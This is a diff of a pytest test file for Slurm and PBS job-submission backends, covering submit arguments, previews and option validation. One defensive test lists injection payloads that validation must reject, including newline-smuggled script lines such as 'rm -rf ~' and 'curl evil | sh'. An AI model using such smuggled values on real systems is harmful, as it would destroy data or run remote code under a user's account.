@@ -5,7 +5,7 @@ from datetime import UTC, datetime
 import pytest
 from pydantic import ValidationError
 
-from typantic.web.backends.base import LaunchUncertainError
+from typantic.web.backends.base import LaunchUncertainError, PollResult
 from typantic.web.backends.pbs import (
     PbsBackend,
     _job_name,
@@ -13,6 +13,7 @@ from typantic.web.backends.pbs import (
     _walltime,
 )
 from typantic.web.backends.scheduler import (
+    SchedulerBackend,
     SchedulerError,
     SchedulerParams,
     _default_runner,
@@ -87,8 +88,6 @@ def test_slurm_launch_writes_script_and_returns_id(tmp_path):
     assert launched.status is JobStatus.QUEUED
     script = (tmp_path / "submit.sh").read_text()
     for directive in (
-        "#SBATCH --job-name=",
-        f"#SBATCH --output={tmp_path / 'job.log'}",
         "#SBATCH --partition=gpu",
         "#SBATCH --gres=gpu:2",
         "#SBATCH --cpus-per-task=4",
@@ -97,7 +96,14 @@ def test_slurm_launch_writes_script_and_returns_id(tmp_path):
         "#SBATCH --nodes=1",
     ):
         assert directive in script
-    assert runner.calls[0] == ["sbatch", "--parsable", str(tmp_path / "submit.sh")]
+    assert runner.calls[0] == [
+        "sbatch",
+        f"--job-name={tmp_path.name}",
+        f"--output={tmp_path / 'job.log'}",
+        f"--chdir={tmp_path}",
+        "--parsable",
+        str(tmp_path / "submit.sh"),
+    ]
 
 
 def test_slurm_launch_strips_cluster_suffix(tmp_path):
@@ -197,14 +203,13 @@ def test_slurm_cancel_without_id_is_noop(tmp_path):
 
 
 def test_slurm_preview_returns_script(tmp_path):
-    script = SlurmBackend(FakeRunner()).preview(
+    preview = SlurmBackend(FakeRunner()).preview(
         ARGV,
         job_dir=tmp_path,
         log_path=tmp_path / "log",
-        backend_options={},
+        backend_options={"partition": "gpu"},
     )
-    assert script.startswith("#!/bin/bash")
-    assert "#SBATCH" in script
+    assert "\n#!/bin/bash\n#SBATCH --partition=gpu\n" in preview
 
 
 # --- PBS ---
@@ -217,17 +222,25 @@ def test_pbs_launch_writes_script(tmp_path):
         ARGV,
         job_dir=tmp_path,
         log_path=tmp_path / "job.log",
-        backend_options=FULL_OPTS,
+        # PBS sizes are "16gb": "16G" is Slurm's spelling.
+        backend_options={**FULL_OPTS, "mem": "16gb"},
     )
     assert launched.scheduler_id == "1234.pbs"
     script = (tmp_path / "submit.sh").read_text()
-    assert "#PBS -N j" in script
-    assert "#PBS -j oe" in script
     assert "#PBS -q gpu" in script
-    assert "#PBS -l select=1:ncpus=4:ngpus=2:mem=16G" in script
+    assert "#PBS -l select=1:ncpus=4:ngpus=2:mem=16gb" in script
     assert "#PBS -l walltime=01:30:00" in script
     assert "#PBS --nodes=1" in script
-    assert runner.calls[0] == ["qsub", str(tmp_path / "submit.sh")]
+    assert runner.calls[0] == [
+        "qsub",
+        "-N",
+        _job_name(tmp_path.name),
+        "-o",
+        str(tmp_path / "job.log"),
+        "-j",
+        "oe",
+        str(tmp_path / "submit.sh"),
+    ]
 
 
 @pytest.mark.parametrize(
@@ -370,3 +383,96 @@ def test_a_refused_cancel_is_reported(tmp_path, backend):
     runner.set("qdel", returncode=35, stderr="qdel: Unknown Job Id")
     with pytest.raises(SchedulerError, match="Cancel failed"):
         backend(runner).cancel(_record(tmp_path, scheduler_id="55"))
+
+
+# --- scheduler control arguments and directives ---
+
+
+@pytest.mark.parametrize("backend", [SlurmBackend, PbsBackend])
+def test_a_jobs_path_with_a_space_stays_one_argument(tmp_path, backend):
+    # The job's log and folder were written unquoted into #SBATCH / #PBS lines;
+    # as submit arguments they need no quoting at all.
+    job_dir = tmp_path / "my jobs" / "j1"
+    job_dir.mkdir(parents=True)
+    runner = FakeRunner()
+    runner.set("sbatch", stdout="1\n")
+    runner.set("qsub", stdout="1.pbs\n")
+    backend(runner).launch(
+        ARGV, job_dir=job_dir, log_path=job_dir / "job.log", backend_options={}
+    )
+    submit = runner.calls[0]
+    assert any(arg.endswith(str(job_dir / "job.log")) for arg in submit)
+    script = (job_dir / "submit.sh").read_text()
+    assert "--output" not in script
+    assert "#PBS -o" not in script
+
+
+@pytest.mark.parametrize(
+    "options",
+    [
+        {"partition": "gpu\n#SBATCH --uid=0"},
+        {"partition": "gpu\ntouch /tmp/pwned"},
+        {"partition": "a b"},
+        {"partition": "gpu#x"},
+        {"mem": "16G\nrm -rf ~"},
+        {"extra": ["--nodes=1\ncurl evil | sh"]},
+        {"extra": ["--nodes=1\r"]},
+    ],
+)
+def test_a_directive_cannot_smuggle_in_a_script_line(options):
+    # Each option becomes a line of the batch script, which runs as the user on
+    # the cluster: a newline in one would start a shell command.
+    with pytest.raises(ValidationError):
+        SchedulerParams.model_validate(options)
+
+
+def test_directives_that_are_one_line_are_accepted():
+    params = SchedulerParams.model_validate(
+        {"partition": "gpu-a100", "mem": "16gb", "extra": ["--comment=a b # c"]}
+    )
+    assert params.extra == ["--comment=a b # c"]
+
+
+@pytest.mark.parametrize(
+    ("backend", "tool"), [(SlurmBackend, "sbatch"), (PbsBackend, "qsub")]
+)
+def test_the_preview_shows_the_submit_command(tmp_path, backend, tool):
+    preview = backend(FakeRunner()).preview(
+        ARGV, job_dir=tmp_path, log_path=tmp_path / "job.log", backend_options={}
+    )
+    first, _, script = preview.partition("\n")
+    assert first.startswith(f"# Submitted with: {tool} ")
+    assert first.endswith(str(tmp_path / "submit.sh"))
+    assert str(tmp_path / "job.log") in first
+    assert script.startswith("#!/bin/bash")
+
+
+def test_a_scheduler_subclass_without_control_args_submits_as_before(tmp_path):
+    # A third-party scheduler written against the old hooks keeps its own
+    # submit command and directives untouched.
+    class Lsf(SchedulerBackend):
+        def _directives(self, params, *, job_dir, log_path):
+            return [f"#BSUB -o {log_path}"]
+
+        def _submit_command(self, script_path):
+            return ["bsub", str(script_path)]
+
+        def _parse_submit(self, stdout):
+            return stdout.strip()
+
+        def _status_command(self, job_id):
+            return ["bjobs", job_id]
+
+        def _parse_status(self, stdout):
+            return PollResult(status=JobStatus.QUEUED)
+
+        def _cancel_command(self, job_id):
+            return ["bkill", job_id]
+
+    runner = FakeRunner()
+    runner.set("bsub", stdout="77\n")
+    Lsf(runner).launch(
+        ARGV, job_dir=tmp_path, log_path=tmp_path / "job.log", backend_options={}
+    )
+    assert runner.calls[0] == ["bsub", str(tmp_path / "submit.sh")]
+    assert f"#BSUB -o {tmp_path / 'job.log'}" in (tmp_path / "submit.sh").read_text()
